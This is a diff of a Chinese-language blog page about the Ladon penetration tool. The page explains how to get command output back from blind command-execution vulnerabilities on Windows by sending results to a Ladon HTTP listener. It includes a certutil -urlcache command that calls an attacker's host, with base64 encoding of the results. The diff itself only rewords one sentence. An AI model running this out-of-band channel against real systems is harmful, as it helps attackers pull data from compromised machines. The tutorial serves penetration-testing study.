@@ -198,7 +198,7 @@
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法（<a href="http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。">http://k8gege.org/Ladon/web_javarce.html）。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。</a></p>
 <h3 id="启动WEB"><a href="#启动WEB" class="headerlink" title="启动WEB"></a>启动WEB</h3><p>Ladon web 800</p>
 <p>PS: 建议使用8.1以后版本，以免netstat -an等长度过长结果无法接收</p>
-<h3 id="浏览器回显"><a href="#浏览器回显" class="headerlink" title="浏览器回显"></a>浏览器回显</h3><p>直接执行PS1，或向浏览器访问即可看琶Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p>
+<h3 id="浏览器回显"><a href="#浏览器回显" class="headerlink" title="浏览器回显"></a>浏览器回显</h3><p>由于是HTTP协议，可以通过浏览器访问得到Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p>
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
 <h3 id="certutill回显"><a href="#certutill回显" class="headerlink" title="certutill回显"></a>certutill回显</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.43:800/getstr/cve2020</span><br></pre></td></tr></table></figure>
 
